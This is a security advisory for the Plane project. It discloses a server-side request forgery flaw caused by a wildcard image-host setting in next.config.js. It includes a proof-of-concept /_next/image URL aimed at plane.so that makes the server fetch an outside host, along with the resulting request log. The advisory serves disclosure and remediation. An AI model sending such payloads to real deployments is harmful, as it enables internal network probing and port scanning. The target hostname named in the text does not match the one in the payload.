# Server side request forgery via /\_next/image endpoint

Critical

[sriramveeraghanta](/sriramveeraghanta)
published
GHSA-39gx-38xf-c348
Oct 11, 2024

## Package

No package listed

## Affected versions

<= v0.22-dev

## Patched versions

v0.23

## Description

### Summary

I noticed the use of `**` wildcard support to retrieve the image from any hostname as in [/web/next.config.js#L31](https://github.com/makeplane/plane/blob/9f20936c869ccbb10f8a0814dacbed802e55b2c8/web/next.config.js#L31).

```
  images: {
    remotePatterns: [
      {
        protocol: "https",
        hostname: "**",
      },
    ],
```
### PoC

This may permit an attacker to induce the server side into performing requests to unintended location like in :

```
https://plane.so/_next/image?url=https%3A%2F%2F3dj9lr9c.c5.rs%2F%3F%23_next%2Fstatic%2Fmedia%2Fplane-logo-with-text.31443952.png&w=384&q=75

```

This payload would induce the server side to issue a GET request to `ggh4j3ko.c5.rs`

which may results into

```
GET / HTTP/1.0
User-Agent: imgix/3.0.0.0
Host: 3dj9lr9c.c5.rs
Accept-Encoding: gzip, deflate, br
Traceparent: 00-9eb3aa5e9a29201e79c5cbfd5178ecc1-c46fe33d08d44ae1-00
X-Imgix-Hops: 1
Accept: */*
Connection: close

```
### Impact

A similar impact as in [GHSA-j77v-w36v-63v6](https://github.com/makeplane/plane/security/advisories/GHSA-j77v-w36v-63v6 "GHSA-j77v-w36v-63v6") , with port scanning possible.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
